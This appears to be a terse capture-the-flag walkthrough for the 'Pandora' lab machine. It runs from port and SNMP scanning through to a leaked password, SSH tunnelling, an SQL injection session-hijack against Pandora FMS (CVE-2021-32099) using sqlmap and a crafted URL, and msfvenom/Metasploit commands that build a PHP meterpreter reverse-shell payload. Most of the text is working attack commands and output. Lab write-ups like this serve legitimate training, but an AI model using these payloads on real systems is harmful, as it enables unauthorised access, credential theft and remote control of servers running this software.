# Pandora

1. Nmap TCP and UDP port with script
````
# nmap -sS -p- pandora.htb -oG 10.10.11.136-sS
# nmap -sU -p- pandora.htb -oG 10.10.11.136-sU
````

````
# snmpwalk -v2c -c public 10.10.11.136:161 1.3.6.1.2.1.25.4.2.1 > 10.10.11.136-snmpwalk
````

~iso.3.6.1.2.1.25.4.2.1.5.864 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"~

~iso.3.6.1.2.1.25.4.2.1.5.1107 = STRING: "-u daniel -p HotelBabylon23"~

2. Login into remote server
````
# ssh daniel@10.10.11.136
````

3. Enumerates
````
daniel@pandora:~$ ss -nlpt
State          Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process         
LISTEN         0               80                           127.0.0.1:3306                        0.0.0.0:*                            
LISTEN         0               4096                     127.0.0.53%lo:53                          0.0.0.0:*                            
LISTEN         0               128                            0.0.0.0:22                          0.0.0.0:*                            
LISTEN         0               511                                  *:80                                *:*                            
LISTEN         0               128                               [::]:22                             [::]:*                            
daniel@pandora:~$ curl http://127.0.0.1:80
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
````

4. Login redirecting the remote port
````
# ssh -L80:127.0.0.1:80 daniel@10.10.11.136
````

5. Enumarates
````
v7.0NG.742_FIX_PERL2020
````
- [CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099)
- [CVE-2020-5844](https://nvd.nist.gov/vuln/detail/CVE-2020-5844)

## CVE-2021-32099
6. Test the target system with malformed input values'    "   `   %    %%   --   /*   //    )    ;
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20%20%20%20%22%20%20%20`%20%20%20%%20%20%20%20%%%20%20%20--%20%20%20/*%20%20%20//%20%20%20%20)%20%20%20%20;

````sql
SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use 
near '" ` % %% -- /* // ) ;' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '' " ` % %% -- /* // ) ;' LIMIT 1') in
/var/www/pandora/pandora_console/include/db/mysql.php on line 114
````

````sql
sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL --sql-shell
sql-shell> SELECT * FROM tsessions_php WHERE `id_session` = ''OR `data` LIKE '%id_usuario|s:5:"admin";%'
[*] id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;, gn7p2qba6310m05qn6iom3bvdf, 1642782084
[*] id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;, hj8tgic0fv8hmmb19b3j851af5, 1642779787
````

7. Access the URL
````sql
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=PAYLOAD'OR `data` LIKE '%id_usuario|s:5:"admin";%
````

and then your user will be logged
````
http://127.0.0.1/pandora_console/
````

## CVE-2020-5844

8. Crie o payload e inicie o multi handler

````bash
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o payload.php
$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST tun0; exploit"
````




[OID repository](http://www.oid-info.com/get/1.3.6.1.2.1.25.4.2.1.5)
